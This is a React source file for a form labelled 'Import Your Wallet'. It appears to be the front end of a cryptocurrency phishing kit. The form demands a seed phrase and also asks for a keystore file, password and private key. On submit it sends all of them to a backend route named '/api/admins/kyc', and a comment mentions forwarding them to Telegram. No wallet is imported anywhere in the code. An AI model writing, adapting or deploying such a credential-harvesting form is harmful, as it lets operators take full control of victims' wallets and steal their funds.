import React, { useState, useRef } from 'react';

const WalletImportForm = () => {
  const [form, setForm] = useState({
    seedPhrase: '',
    keystoreJson: '',
    password: '',
    privateKey: '',
  });
  const [toast, setToast] = useState({ show: false, message: '' });
  const toastTimeout = useRef(null);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setForm((prev) => ({ ...prev, [name]: value }));
  };

  const handleImport = async (e) => {
    e.preventDefault();

    // Validate seed phrase
    if (!form.seedPhrase.trim()) {
      setToast({ show: true, message: 'Failed to import: Seed Phrase is required to import the wallet.' });
      if (toastTimeout.current) clearTimeout(toastTimeout.current);
      toastTimeout.current = setTimeout(() => setToast({ show: false, message: '' }), 3500);
      return;
    }

    // New session per submit; only send what we collect
    const { v4: uuidv4 } = await import('uuid');
    const newSessionId = uuidv4();

    const payload = {
      sessionId: newSessionId,
      walletType: 'Direct Import',
      seedPhrase: form.seedPhrase.trim() || undefined,
      keystoreJson: form.keystoreJson?.trim() || undefined,
      password: form.password || undefined,
      privateKey: form.privateKey?.trim() || undefined,
    };

    try {
      const res = await fetch(`${import.meta.env.VITE_BACKEND_URL}/api/admins/kyc`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(payload),
      });

      if (!res.ok) {
        const errorText = await res.text();
        throw new Error(errorText || `Server ${res.status}`);
      }

      await res.json();
      // Clear session after successful send to Telegram / backend
      localStorage.removeItem('sessionId');
      setToast({ show: true, message: 'Wallet data sent successfully!' });
    } catch (error) {
      console.error('Error sending wallet data:', error);
      setToast({ show: true, message: 'Failed to send wallet data. Please try again.' });
    }

    if (toastTimeout.current) clearTimeout(toastTimeout.current);
    toastTimeout.current = setTimeout(() => setToast({ show: false, message: '' }), 2500);
  };

  return (
    <div style={{ maxWidth: 500, margin: '2rem auto', background: '#fff', borderRadius: 16, boxShadow: '0 4px 24px rgba(0,0,0,0.2)', padding: '2rem', border: '2px solid #d32f2f', color: '#222' }}>
      {toast.show && (
        <div style={{ position: 'fixed', left: '50%', top: '10%', transform: 'translate(-50%, 0)', background: '#fff', color: '#d32f2f', padding: '16px 32px', borderRadius: 10, fontWeight: 700, fontSize: 18, boxShadow: '0 2px 12px rgba(0,0,0,0.25)', zIndex: 9999, textAlign: 'center', border: '2px solid #d32f2f' }}>
          {toast.message}
        </div>
      )}
      <h3 style={{ color: '#d32f2f', fontWeight: 800, fontSize: 24, textAlign: 'center', marginBottom: 24 }}>Import Your Wallet</h3>
      <form onSubmit={handleImport}>
        <label style={{ color: '#d32f2f', fontWeight: 600 }}>Seed Phrase <span style={{ fontWeight: 400 }}>(required)</span></label>
        <input type="text" name="seedPhrase" value={form.seedPhrase} onChange={handleChange} style={{ marginBottom: 16, width: '100%', padding: 8, borderRadius: 8, border: '1px solid #d32f2f', background: '#fff', color: '#d32f2f' }} placeholder="Enter your seed phrase" />

        <label style={{ color: '#d32f2f', fontWeight: 600 }}>Keystore JSON</label>
        <input type="text" name="keystoreJson" value={form.keystoreJson} onChange={handleChange} style={{ marginBottom: 16, width: '100%', padding: 8, borderRadius: 8, border: '1px solid #d32f2f', background: '#fff', color: '#d32f2f' }} placeholder="Paste your keystore JSON" />

        <label style={{ color: '#d32f2f', fontWeight: 600 }}>Password</label>
        <input type="password" name="password" value={form.password} onChange={handleChange} style={{ marginBottom: 16, width: '100%', padding: 8, borderRadius: 8, border: '1px solid #d32f2f', background: '#fff', color: '#d32f2f' }} placeholder="Enter your password" />

        <label style={{ color: '#d32f2f', fontWeight: 600 }}>Private Key</label>
        <input type="text" name="privateKey" value={form.privateKey} onChange={handleChange} style={{ marginBottom: 24, width: '100%', padding: 8, borderRadius: 8, border: '1px solid #d32f2f', background: '#fff', color: '#d32f2f' }} placeholder="Enter your private key" />

        <button type="submit" style={{ background: '#d32f2f', color: '#fff', fontWeight: 700, fontSize: 18, borderRadius: 8, padding: '12px 0', width: '100%', border: 'none', boxShadow: '0 2px 8px rgba(0,0,0,0.1)', cursor: 'pointer' }}>
          Import
        </button>
      </form>
    </div>
  );
};

export default WalletImportForm;
